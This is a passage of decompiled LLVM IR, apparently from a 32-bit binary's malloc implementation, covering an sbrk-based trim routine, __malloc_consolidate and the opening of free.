  %v0_804abd4 = load i32, i32* @esi, align 4
  %v1_804abd9 = add i32 %v0_804abd1, 860
  %v2_804abd9 = inttoptr i32 %v1_804abd9 to i32*
  %v3_804abd9 = load i32, i32* %v2_804abd9, align 4
  store i32 %v3_804abd9, i32* @ecx, align 4
  %v1_804abdf = add i32 %v0_804abd1, 44
  %v2_804abdf = inttoptr i32 %v1_804abdf to i32*
  %v3_804abdf = load i32, i32* %v2_804abdf, align 4
  %v1_804abe2 = add i32 %v3_804abdf, 4
  %v2_804abe2 = inttoptr i32 %v1_804abe2 to i32*
  %v3_804abe2 = load i32, i32* %v2_804abe2, align 4
  %v1_804abe5 = and i32 %v3_804abe2, -4
  store i32 %v1_804abe5, i32* @esi, align 4
  %v1_804abea = load i32, i32* @eax, align 4
  %v2_804abea = add i32 %v3_804abd9, -17
  %v2_804abec = add i32 %v2_804abea, %v1_804abe5
  %v3_804abec = sub i32 %v2_804abec, %v1_804abea
  %div = udiv i32 %v3_804abec, %v3_804abd9
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_804abec, %v3_804abd9
  store i32 %tmp10, i32* @edx, align 4
  %v1_804abf4 = add i32 %div, -1
  %v4_804abf7 = mul i32 %v1_804abf4, %v3_804abd9
  store i32 %v4_804abf7, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804abf7, 1
  br i1 %tmp11, label %dec_label_pc_804ac53, label %dec_label_pc_804abfe

dec_label_pc_804abfe:                             ; preds = %entry
  %v1_804ac03 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804ac03, i32* %edi.global-to-local, align 4
  %v0_804ac0d = load i32, i32* @esi, align 4
  store i32 %v0_804ac0d, i32* %eax.global-to-local, align 4
  %v1_804ac0f = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ac0f = add i32 %v1_804ac0f, 44
  %v3_804ac0f = inttoptr i32 %v2_804ac0f to i32*
  %v4_804ac0f = load i32, i32* %v3_804ac0f, align 4
  %v5_804ac0f = add i32 %v4_804ac0f, %v0_804ac0d
  store i32 %v5_804ac0f, i32* %eax.global-to-local, align 4
  %v12_804ac12 = icmp eq i32 %v1_804ac03, %v5_804ac0f
  %v1_804ac14 = icmp eq i1 %v12_804ac12, false
  br i1 %v1_804ac14, label %dec_label_pc_804ac53, label %dec_label_pc_804ac16

dec_label_pc_804ac16:                             ; preds = %dec_label_pc_804abfe
  %v1_804ac19 = sub i32 0, %v4_804abf7
  store i32 %v1_804ac19, i32* @ebx, align 4
  %v1_804ac1c = call i32 @__GI_sbrk(i32 %v1_804ac19)
  store i32 %v1_804ac1c, i32* %eax.global-to-local, align 4
  %v1_804ac28 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804ac28, i32* %eax.global-to-local, align 4
  %v10_804ac30 = icmp eq i32 %v1_804ac28, -1
  br i1 %v10_804ac30, label %dec_label_pc_804ac53, label %dec_label_pc_804ac35

dec_label_pc_804ac35:                             ; preds = %dec_label_pc_804ac16
  %v0_804ac35 = load i32, i32* %edi.global-to-local, align 4
  %v2_804ac37 = sub i32 %v0_804ac35, %v1_804ac28
  %v12_804ac37 = icmp eq i32 %v2_804ac37, 0
  store i32 %v2_804ac37, i32* @ecx, align 4
  br i1 %v12_804ac37, label %dec_label_pc_804ac53, label %dec_label_pc_804ac3b

dec_label_pc_804ac3b:                             ; preds = %dec_label_pc_804ac35
  %v0_804ac3b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ac3b = add i32 %v0_804ac3b, 44
  %v2_804ac3b = inttoptr i32 %v1_804ac3b to i32*
  %v3_804ac3b = load i32, i32* %v2_804ac3b, align 4
  store i32 %v3_804ac3b, i32* %eax.global-to-local, align 4
  %v0_804ac3e = load i32, i32* @esi, align 4
  %v2_804ac3e = sub i32 %v0_804ac3e, %v2_804ac37
  store i32 %v2_804ac3e, i32* %esi.global-to-local, align 4
  %v1_804ac40 = add i32 %v0_804ac3b, 872
  %v2_804ac40 = inttoptr i32 %v1_804ac40 to i32*
  %v3_804ac40 = load i32, i32* %v2_804ac40, align 4
  %v5_804ac40 = sub i32 %v3_804ac40, %v2_804ac37
  store i32 %v5_804ac40, i32* %v2_804ac40, align 4
  %v0_804ac46 = load i32, i32* %esi.global-to-local, align 4
  %v1_804ac46 = or i32 %v0_804ac46, 1
  store i32 %v1_804ac46, i32* %esi.global-to-local, align 4
  %v1_804ac49 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ac49 = add i32 %v1_804ac49, 4
  %v3_804ac49 = inttoptr i32 %v2_804ac49 to i32*
  store i32 %v1_804ac46, i32* %v3_804ac49, align 4
  br label %dec_label_pc_804ac55

dec_label_pc_804ac53:                             ; preds = %dec_label_pc_804ac35, %dec_label_pc_804ac16, %dec_label_pc_804abfe, %entry
  br label %dec_label_pc_804ac55

dec_label_pc_804ac55:                             ; preds = %dec_label_pc_804ac3b, %dec_label_pc_804ac53
  %storemerge = phi i32 [ 1, %dec_label_pc_804ac3b ], [ 0, %dec_label_pc_804ac53 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804abd4, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804ac28, { 1, 0, 2 }
  uselistorder i32 %v4_804abf7, { 1, 2, 0 }
  uselistorder i32 %v3_804abd9, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_804abd1, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_804ac55, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_804ac5e = load i32, i32* @edi, align 4
  %v0_804ac5f = load i32, i32* @esi, align 4
  %v0_804ac60 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_804ac68 = load i32, i32* %arg1, align 4
  store i32 %v2_804ac68, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804ac6f = icmp eq i32 %v2_804ac68, 0
  br i1 %v1_804ac6f, label %dec_label_pc_804ad98.preheader, label %dec_label_pc_804ac77

dec_label_pc_804ad98.preheader:                   ; preds = %entry
  %v3_804ad8d = add i32 %tmp11, 44
  br label %dec_label_pc_804ad89

dec_label_pc_804ac77:                             ; preds = %entry
  %v1_804ac7b = and i32 %v2_804ac68, -3
  store i32 %v1_804ac7b, i32* %arg1, align 4
  %v1_804ac80 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_804ac8f = add i32 %tmp11, 4
  store i32 %v1_804ac8f, i32* %eax.global-to-local, align 4
  %v2_804ac96 = load i32, i32* %arg1, align 4
  %v2_804ac9c = udiv i32 %v2_804ac96, 8
  %v2_804ac9f = mul nuw i32 %v2_804ac9c, 4
  %v3_804ac9f = add i32 %tmp11, -4
  %v4_804ac9f = add i32 %v3_804ac9f, %v2_804ac9f
  store i32 %v4_804ac9f, i32* %eax.global-to-local, align 4
  %v2_804ad66 = add i32 %tmp11, 44
  %v3_804ad66 = inttoptr i32 %v2_804ad66 to i32*
  %v1_804ad39 = add i32 %tmp11, 60
  %v2_804ad39 = inttoptr i32 %v1_804ad39 to i32*
  br label %dec_label_pc_804aca7

dec_label_pc_804aca7:                             ; preds = %dec_label_pc_804ad7f, %dec_label_pc_804ac77
  %v0_804acb5 = phi i32 [ %v1_804ac8f, %dec_label_pc_804ac77 ], [ %v4_804ad7f, %dec_label_pc_804ad7f ]
  store i32 %v0_804acb5, i32* %eax.global-to-local, align 4
  %v1_804acab = inttoptr i32 %v0_804acb5 to i32*
  %v2_804acab = load i32, i32* %v1_804acab, align 4
  store i32 %v2_804acab, i32* @ecx, align 4
  %v1_804acad = icmp eq i32 %v2_804acab, 0
  br i1 %v1_804acad, label %dec_label_pc_804ad75, label %dec_label_pc_804acb5

dec_label_pc_804acb5:                             ; preds = %dec_label_pc_804aca7
  store i32 0, i32* %v1_804acab, align 4
  %v0_804acbb.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804acbb

dec_label_pc_804acbb:                             ; preds = %dec_label_pc_804ad69, %dec_label_pc_804acb5
  %v0_804acd8 = phi i32 [ %v3_804acbb, %dec_label_pc_804ad69 ], [ %v0_804acbb.pre, %dec_label_pc_804acb5 ]
  %v1_804acbb = add i32 %v0_804acd8, 8
  %v2_804acbb = inttoptr i32 %v1_804acbb to i32*
  %v3_804acbb = load i32, i32* %v2_804acbb, align 4
  store i32 %v3_804acbb, i32* %edx.global-to-local, align 4
  %v1_804acc2 = add i32 %v0_804acd8, 4
  %v2_804acc2 = inttoptr i32 %v1_804acc2 to i32*
  %v3_804acc2 = load i32, i32* %v2_804acc2, align 4
  store i32 %v3_804acc2, i32* %eax.global-to-local, align 4
  %v1_804acc7 = and i32 %v3_804acc2, -2
  store i32 %v1_804acc7, i32* @edi, align 4
  %v2_804acca = urem i32 %v3_804acc2, 2
  %v3_804acca = icmp eq i32 %v2_804acca, 0
  %v2_804accc = add i32 %v1_804acc7, %v0_804acd8
  store i32 %v2_804accc, i32* @ebx, align 4
  %v1_804accf = add i32 %v2_804accc, 4
  %v2_804accf = inttoptr i32 %v1_804accf to i32*
  %v3_804accf = load i32, i32* %v2_804accf, align 4
  store i32 %v3_804accf, i32* %edx.global-to-local, align 4
  %v1_804acd6 = icmp eq i1 %v3_804acca, false
  br i1 %v1_804acd6, label %dec_label_pc_804acf8, label %dec_label_pc_804acd8

dec_label_pc_804acd8:                             ; preds = %dec_label_pc_804acbb
  %v1_804acd8 = inttoptr i32 %v0_804acd8 to i32*
  %v2_804acd8 = load i32, i32* %v1_804acd8, align 4
  store i32 %v2_804acd8, i32* %ebp.global-to-local, align 4
  %v2_804acdc = sub i32 %v0_804acd8, %v2_804acd8
  store i32 %v2_804acdc, i32* %eax.global-to-local, align 4
  %v1_804acde = add i32 %v2_804acdc, 8
  %v2_804acde = inttoptr i32 %v1_804acde to i32*
  %v3_804acde = load i32, i32* %v2_804acde, align 4
  store i32 %v3_804acde, i32* @esi, align 4
  %v1_804ace1 = add i32 %v2_804acdc, 12
  %v2_804ace1 = inttoptr i32 %v1_804ace1 to i32*
  %v3_804ace1 = load i32, i32* %v2_804ace1, align 4
  store i32 %v3_804ace1, i32* %edx.global-to-local, align 4
  %v1_804ace4 = add i32 %v3_804acde, 12
  %v2_804ace4 = inttoptr i32 %v1_804ace4 to i32*
  %v3_804ace4 = load i32, i32* %v2_804ace4, align 4
  store i32 %v3_804ace4, i32* @ecx, align 4
  %v12_804ace7 = icmp eq i32 %v3_804ace4, %v2_804acdc
  %v1_804ace9 = icmp eq i1 %v12_804ace7, false
  br i1 %v1_804ace9, label %dec_label_pc_804ad28, label %dec_label_pc_804aceb

dec_label_pc_804aceb:                             ; preds = %dec_label_pc_804acd8
  %v1_804aceb = add i32 %v3_804ace1, 8
  %v2_804aceb = inttoptr i32 %v1_804aceb to i32*
  %v3_804aceb = load i32, i32* %v2_804aceb, align 4
  %v15_804aceb = icmp eq i32 %v3_804aceb, %v3_804ace4
  %v1_804acee = icmp eq i1 %v15_804aceb, false
  br i1 %v1_804acee, label %dec_label_pc_804ad28, label %dec_label_pc_804acf0

dec_label_pc_804acf0:                             ; preds = %dec_label_pc_804aceb
  %v2_804acf0 = add i32 %v2_804acd8, %v1_804acc7
  store i32 %v2_804acf0, i32* @edi, align 4
  store i32 %v3_804ace1, i32* %v2_804ace4, align 4
  %v0_804acf5 = load i32, i32* @esi, align 4
  %v1_804acf5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804acf5 = add i32 %v1_804acf5, 8
  %v3_804acf5 = inttoptr i32 %v2_804acf5 to i32*
  store i32 %v0_804acf5, i32* %v3_804acf5, align 4
  %v0_804ad03.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804acf8

dec_label_pc_804acf8:                             ; preds = %dec_label_pc_804acbb, %dec_label_pc_804acf0
  %v1_804ad0c = phi i32 [ %v2_804accc, %dec_label_pc_804acbb ], [ %v0_804ad03.pre, %dec_label_pc_804acf0 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804ad00 = and i32 %v3_804accf, -4
  store i32 %v1_804ad00, i32* %ebp.global-to-local, align 4
  %v4_804ad03 = load i32, i32* %v3_804ad66, align 4
  %v15_804ad03 = icmp eq i32 %v1_804ad0c, %v4_804ad03
  br i1 %v15_804ad03, label %dec_label_pc_804ad59, label %dec_label_pc_804ad08

dec_label_pc_804ad08:                             ; preds = %dec_label_pc_804acf8
  %v2_804ad08 = add i32 %v1_804ad0c, 4
  %v3_804ad08 = add i32 %v2_804ad08, %v1_804ad00
  %v4_804ad08 = inttoptr i32 %v3_804ad08 to i32*
  %v5_804ad08 = load i32, i32* %v4_804ad08, align 4
  store i32 %v5_804ad08, i32* %eax.global-to-local, align 4
  %v3_804ad0c = inttoptr i32 %v2_804ad08 to i32*
  store i32 %v1_804ad00, i32* %v3_804ad0c, align 4
  %v0_804ad0f = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad0f = urem i32 %v0_804ad0f, 2
  %v2_804ad0f = icmp eq i32 %v1_804ad0f, 0
  store i32 %v1_804ad0f, i32* %eax.global-to-local, align 4
  %v1_804ad14 = icmp eq i1 %v2_804ad0f, false
  br i1 %v1_804ad14, label %dec_label_pc_804ad35, label %dec_label_pc_804ad16

dec_label_pc_804ad16:                             ; preds = %dec_label_pc_804ad08
  %v0_804ad16 = load i32, i32* @ebx, align 4
  %v1_804ad16 = add i32 %v0_804ad16, 8
  %v2_804ad16 = inttoptr i32 %v1_804ad16 to i32*
  %v3_804ad16 = load i32, i32* %v2_804ad16, align 4
  store i32 %v3_804ad16, i32* @edx, align 4
  %v1_804ad19 = add i32 %v0_804ad16, 12
  %v2_804ad19 = inttoptr i32 %v1_804ad19 to i32*
  %v3_804ad19 = load i32, i32* %v2_804ad19, align 4
  store i32 %v3_804ad19, i32* %eax.global-to-local, align 4
  %v1_804ad1c = add i32 %v3_804ad16, 12
  %v2_804ad1c = inttoptr i32 %v1_804ad1c to i32*
  %v3_804ad1c = load i32, i32* %v2_804ad1c, align 4
  store i32 %v3_804ad1c, i32* @esi, align 4
  %v12_804ad1f = icmp eq i32 %v3_804ad1c, %v0_804ad16
  %v1_804ad21 = icmp eq i1 %v12_804ad1f, false
  br i1 %v1_804ad21, label %dec_label_pc_804ad28, label %dec_label_pc_804ad23

dec_label_pc_804ad23:                             ; preds = %dec_label_pc_804ad16
  %v1_804ad23 = add i32 %v3_804ad19, 8
  %v2_804ad23 = inttoptr i32 %v1_804ad23 to i32*
  %v3_804ad23 = load i32, i32* %v2_804ad23, align 4
  %v15_804ad23 = icmp eq i32 %v3_804ad23, %v3_804ad1c
  br i1 %v15_804ad23, label %dec_label_pc_804ad2d, label %dec_label_pc_804ad28

dec_label_pc_804ad28:                             ; preds = %dec_label_pc_804ad23, %dec_label_pc_804ad16, %dec_label_pc_804aceb, %dec_label_pc_804acd8
  %v0_804ad28 = call i32 @abort()
  store i32 %v0_804ad28, i32* %eax.global-to-local, align 4
  %v1_804ad2f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ad2d

dec_label_pc_804ad2d:                             ; preds = %dec_label_pc_804ad23, %dec_label_pc_804ad28
  %v1_804ad2f = phi i32 [ %v3_804ad16, %dec_label_pc_804ad23 ], [ %v1_804ad2f.pre, %dec_label_pc_804ad28 ]
  %v0_804ad2f = phi i32 [ %v3_804ad19, %dec_label_pc_804ad23 ], [ %v0_804ad28, %dec_label_pc_804ad28 ]
  %v0_804ad2d = load i32, i32* @edi, align 4
  %v1_804ad2d = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ad2d = add i32 %v1_804ad2d, %v0_804ad2d
  store i32 %v2_804ad2d, i32* @edi, align 4
  %v2_804ad2f = add i32 %v1_804ad2f, 12
  %v3_804ad2f = inttoptr i32 %v2_804ad2f to i32*
  store i32 %v0_804ad2f, i32* %v3_804ad2f, align 4
  %v0_804ad32 = load i32, i32* @edx, align 4
  %v1_804ad32 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ad32 = add i32 %v1_804ad32, 8
  %v3_804ad32 = inttoptr i32 %v2_804ad32 to i32*
  store i32 %v0_804ad32, i32* %v3_804ad32, align 4
  br label %dec_label_pc_804ad35

dec_label_pc_804ad35:                             ; preds = %dec_label_pc_804ad08, %dec_label_pc_804ad2d
  store i32 %v1_804ac80, i32* %eax.global-to-local, align 4
  %v3_804ad39 = load i32, i32* %v2_804ad39, align 4
  store i32 %v3_804ad39, i32* @edx, align 4
  %v0_804ad3c = load i32, i32* @ecx, align 4
  store i32 %v0_804ad3c, i32* %v2_804ad39, align 4
  %v0_804ad3f = load i32, i32* @edi, align 4
  %v1_804ad41 = or i32 %v0_804ad3f, 1
  %v1_804ad44 = load i32, i32* @ecx, align 4
  %v2_804ad44 = add i32 %v1_804ad44, 4
  %v3_804ad44 = inttoptr i32 %v2_804ad44 to i32*
  store i32 %v1_804ad41, i32* %v3_804ad44, align 4
  %v0_804ad47 = load i32, i32* @ecx, align 4
  %v1_804ad47 = load i32, i32* @edx, align 4
  %v2_804ad47 = add i32 %v1_804ad47, 12
  %v3_804ad47 = inttoptr i32 %v2_804ad47 to i32*
  store i32 %v0_804ad47, i32* %v3_804ad47, align 4
  store i32 %v1_804ac80, i32* %eax.global-to-local, align 4
  %v0_804ad4e = load i32, i32* @edx, align 4
  %v1_804ad4e = load i32, i32* @ecx, align 4
  %v2_804ad4e = add i32 %v1_804ad4e, 8
  %v3_804ad4e = inttoptr i32 %v2_804ad4e to i32*
  store i32 %v0_804ad4e, i32* %v3_804ad4e, align 4
  %v0_804ad51 = load i32, i32* @edi, align 4
  %v1_804ad51 = load i32, i32* @ecx, align 4
  %v3_804ad51 = add i32 %v1_804ad51, %v0_804ad51
  %v4_804ad51 = inttoptr i32 %v3_804ad51 to i32*
  store i32 %v0_804ad51, i32* %v4_804ad51, align 4
  %v0_804ad54 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad54 = load i32, i32* @ecx, align 4
  %v2_804ad54 = add i32 %v1_804ad54, 12
  %v3_804ad54 = inttoptr i32 %v2_804ad54 to i32*
  store i32 %v0_804ad54, i32* %v3_804ad54, align 4
  br label %dec_label_pc_804ad69

dec_label_pc_804ad59:                             ; preds = %dec_label_pc_804acf8
  %v0_804ad59 = load i32, i32* @edi, align 4
  %v2_804ad59 = add i32 %v0_804ad59, %v1_804ad00
  %v1_804ad5c = or i32 %v2_804ad59, 1
  store i32 %v1_804ad5c, i32* %eax.global-to-local, align 4
  %v1_804ad5f = load i32, i32* @ecx, align 4
  %v2_804ad5f = add i32 %v1_804ad5f, 4
  %v3_804ad5f = inttoptr i32 %v2_804ad5f to i32*
  store i32 %v1_804ad5c, i32* %v3_804ad5f, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_804ad66 = load i32, i32* @ecx, align 4
  store i32 %v0_804ad66, i32* %v3_804ad66, align 4
  br label %dec_label_pc_804ad69

dec_label_pc_804ad69:                             ; preds = %dec_label_pc_804ad35, %dec_label_pc_804ad59
  store i32 %v3_804acbb, i32* @ecx, align 4
  %v1_804ad6d = icmp eq i32 %v3_804acbb, 0
  %v1_804ad6f = icmp eq i1 %v1_804ad6d, false
  br i1 %v1_804ad6f, label %dec_label_pc_804acbb, label %dec_label_pc_804ad75

dec_label_pc_804ad75:                             ; preds = %dec_label_pc_804ad69, %dec_label_pc_804aca7
  store i32 %v4_804ac9f, i32* @ecx, align 4
  %v15_804ad79 = icmp eq i32 %v0_804acb5, %v4_804ac9f
  br i1 %v15_804ad79, label %dec_label_pc_804adfd, label %dec_label_pc_804ad7f

dec_label_pc_804ad7f:                             ; preds = %dec_label_pc_804ad75
  %v4_804ad7f = add i32 %v0_804acb5, 4
  br label %dec_label_pc_804aca7

dec_label_pc_804ad89:                             ; preds = %dec_label_pc_804ad98.preheader, %dec_label_pc_804ad89
  %v1_804ad8d20 = phi i32 [ 1, %dec_label_pc_804ad98.preheader ], [ %v0_804ad98.pre, %dec_label_pc_804ad89 ]
  %v2_804ad8d = mul i32 %v1_804ad8d20, 8
  %v4_804ad8d = add i32 %v3_804ad8d, %v2_804ad8d
  store i32 %v4_804ad8d, i32* %eax.global-to-local, align 4
  %v1_804ad91 = add i32 %v1_804ad8d20, 1
  store i32 %v1_804ad91, i32* %edx.global-to-local, align 4
  %v2_804ad92 = add i32 %v4_804ad8d, 12
  %v3_804ad92 = inttoptr i32 %v2_804ad92 to i32*
  store i32 %v4_804ad8d, i32* %v3_804ad92, align 4
  %v0_804ad95 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ad95 = add i32 %v0_804ad95, 8
  %v3_804ad95 = inttoptr i32 %v2_804ad95 to i32*
  store i32 %v0_804ad95, i32* %v3_804ad95, align 4
  %v0_804ad98.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_804ad9b = icmp sgt i32 %v0_804ad98.pre, 95
  br i1 %v7_804ad9b, label %dec_label_pc_804ad9d, label %dec_label_pc_804ad89

dec_label_pc_804ad9d:                             ; preds = %dec_label_pc_804ad89
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804ada1 = add i32 %tmp11, 864
  %v2_804ada1 = inttoptr i32 %v1_804ada1 to i32*
  %v3_804ada1 = load i32, i32* %v2_804ada1, align 4
  %v4_804ada1 = or i32 %v3_804ada1, 1
  store i32 %v4_804ada1, i32* %v2_804ada1, align 4
  %v0_804ada8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ada8 = add i32 %v0_804ada8, 840
  %v2_804ada8 = inttoptr i32 %v1_804ada8 to i32*
  store i32 0, i32* %v2_804ada8, align 4
  %v0_804adb2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804adb2 = add i32 %v0_804adb2, 852
  %v2_804adb2 = inttoptr i32 %v1_804adb2 to i32*
  store i32 65536, i32* %v2_804adb2, align 4
  %v0_804adbc = load i32, i32* %eax.global-to-local, align 4
  %v1_804adbc = add i32 %v0_804adbc, 844
  %v2_804adbc = inttoptr i32 %v1_804adbc to i32*
  store i32 262144, i32* %v2_804adbc, align 4
  %v0_804adc6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804adc6 = add i32 %v0_804adc6, 836
  %v2_804adc6 = inttoptr i32 %v1_804adc6 to i32*
  store i32 262144, i32* %v2_804adc6, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_804add7 = load i32, i32* %arg1, align 4
  %v1_804add9 = urem i32 %v2_804add7, 4
  %v1_804addc = or i32 %v1_804add9, 72
  store i32 %v1_804addc, i32* %arg1, align 4
  %v0_804ade1 = load i32, i32* @edx, align 4
  %v1_804ade3 = add i32 %v0_804ade1, 52
  store i32 %v1_804ade3, i32* %eax.global-to-local, align 4
  %v2_804ade6 = add i32 %v0_804ade1, 44
  %v3_804ade6 = inttoptr i32 %v2_804ade6 to i32*
  store i32 %v1_804ade3, i32* %v3_804ade6, align 4
  %v1_804adeb = call i32 @sysconf(i32 30)
  store i32 %v1_804adeb, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_804adf7 = add i32 %tmp11, 860
  %v3_804adf7 = inttoptr i32 %v2_804adf7 to i32*
  store i32 %v1_804adeb, i32* %v3_804adf7, align 4
  br label %dec_label_pc_804adfd

dec_label_pc_804adfd:                             ; preds = %dec_label_pc_804ad75, %dec_label_pc_804ad9d
  store i32 %v0_804ac60, i32* @ebx, align 4
  store i32 %v0_804ac5f, i32* @esi, align 4
  store i32 %v0_804ac5e, i32* @edi, align 4
  %v0_804ae04 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804ae04

; uselistorder directives
  uselistorder i32 %v0_804ad95, { 1, 0 }
  uselistorder i32 %v0_804ad51, { 1, 0 }
  uselistorder i32 %v1_804ad0f, { 1, 0 }
  uselistorder i32 %v2_804ad08, { 1, 0 }
  uselistorder i32 %v1_804ad00, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804ad0c, { 1, 0 }
  uselistorder i32 %v3_804acbb, { 2, 1, 3, 0 }
  uselistorder i32 %v0_804acd8, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804acb5, { 1, 0, 3, 2 }
  uselistorder i32* %v3_804ad66, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25, 26 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_804adfd, { 1, 0 }
  uselistorder label %dec_label_pc_804ad89, { 1, 0 }
  uselistorder label %dec_label_pc_804ad69, { 1, 0 }
  uselistorder label %dec_label_pc_804ad35, { 1, 0 }
  uselistorder label %dec_label_pc_804ad2d, { 1, 0 }
  uselistorder label %dec_label_pc_804acf8, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804ae05 = load i32, i32* @ebp, align 4
  %v0_804ae06 = load i32, i32* @edi, align 4
  %v0_804ae07 = load i32, i32* @esi, align 4
  %v0_804ae08 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804ae10 = icmp eq i32 %arg1, 0
  br i1 %v1_804ae10, label %dec_label_pc_804af99, label %dec_label_pc_804ae18

dec_label_pc_804ae18:                             ; preds = %entry
  %v2_804ae23 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ae23, i32* @eax, align 4
  %v2_804ae28 = call i32 @__pthread_return_void(i32 %v2_804ae23, i32 134526871)
  store i32 %v2_804ae28, i32* %eax.global-to-local, align 4
  %v1_804ae34 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052044.36 to i32))
  %v1_804ae39 = add i32 %arg1, -8
  store i32 %v1_804ae39, i32* @ecx, align 4
  %v0_804ae3c = load i8, i8* @global_var_8054600.37, align 1
  %v1_804ae3c = sext i8 %v0_804ae3c to i32
  store i32 %v1_804ae3c, i32* %eax.global-to-local, align 4
  %v1_804ae41 = add i32 %arg1, -4
  %v2_804ae41 = inttoptr i32 %v1_804ae41 to i32*
  %v3_804ae41 = load i32, i32* %v2_804ae41, align 4
  store i32 %v3_804ae41, i32* @edx, align 4
  %v1_804ae49 = and i32 %v3_804ae41, -4
  %v4_804ae49 = trunc i32 %v1_804ae49 to i8
  store i32 %v1_804ae49, i32* @ebx, align 4
  %v8_804ae4e = icmp ugt i8 %v4_804ae49, %v0_804ae3c
  br i1 %v8_804ae4e, label %dec_label_pc_804ae70, label %dec_label_pc_804ae50

dec_label_pc_804ae50:                             ; preds = %dec_label_pc_804ae18
  %v1_804ae50 = or i32 %v1_804ae3c, 3
  %v3_804ae50 = trunc i32 %v1_804ae50 to i8
  store i32 %v1_804ae50, i32* %eax.global-to-local, align 4
  %v2_804ae53 = udiv i32 %v3_804ae41, 8
  store i8 %v3_804ae50, i8* @global_var_8054600.37, align 512
  %v1_804ae5b = mul nuw i32 %v2_804ae53, 4
  %v2_804ae5b = add i32 %v1_804ae5b, ptrtoint (i8* @global_var_8054600.37 to i32)
  store i32 %v2_804ae5b, i32* @edx, align 4
  %v1_804ae62 = add i32 %v1_804ae5b, add (i32 ptrtoint (i8* @global_var_8054600.37 to i32), i32 -4)
  %v2_804ae62 = inttoptr i32 %v1_804ae62 to i32*
  %v3_804ae62 = load i32, i32* %v2_804ae62, align 4
  store i32 %v3_804ae62, i32* %eax.global-to-local, align 4
  %v3_804ae65 = inttoptr i32 %arg1 to i32*
  store i32 %v3_804ae62, i32* %v3_804ae65, align 4
  %v0_804ae68 = load i32, i32* @ecx, align 4
  %v1_804ae68 = load i32, i32* @edx, align 4
  %v2_804ae68 = add i32 %v1_804ae68, -4
  %v3_804ae68 = inttoptr i32 %v2_804ae68 to i32*
  store i32 %v0_804ae68, i32* %v3_804ae68, align 4
  br label %dec_label_pc_804af88

dec_label_pc_804ae70:                             ; preds = %dec_label_pc_804ae18
  %v2_804ae70 = and i32 %v3_804ae41, 2
  %v3_804ae70 = icmp eq i32 %v2_804ae70, 0
  %v1_804ae73 = icmp eq i1 %v3_804ae70, false
  br i1 %v1_804ae73, label %dec_label_pc_804af68, label %dec_label_pc_804ae79

dec_label_pc_804ae79:                             ; preds = %dec_label_pc_804ae70
  %v1_804ae79 = or i32 %v1_804ae3c, 1
  %v3_804ae79 = trunc i32 %v1_804ae79 to i8
  store i32 %v1_804ae79, i32* %eax.global-to-local, align 4
  store i8 %v3_804ae79, i8* @global_var_8054600.37, align 512
  %v2_804ae81 = add i32 %v1_804ae49, %v1_804ae39
  store i32 %v2_804ae81, i32* @esi, align 4
  %v1_804ae84 = add i32 %v2_804ae81, 4
  %v2_804ae84 = inttoptr i32 %v1_804ae84 to i32*
  %v3_804ae84 = load i32, i32* %v2_804ae84, align 4
  store i32 %v3_804ae84, i32* %eax.global-to-local, align 4
  %v2_804ae8b = inttoptr i32 %v1_804ae41 to i8*
  %v3_804ae8b = load i8, i8* %v2_804ae8b, align 1
  %v4_804ae8b = urem i8 %v3_804ae8b, 2
  %v5_804ae8b = icmp eq i8 %v4_804ae8b, 0
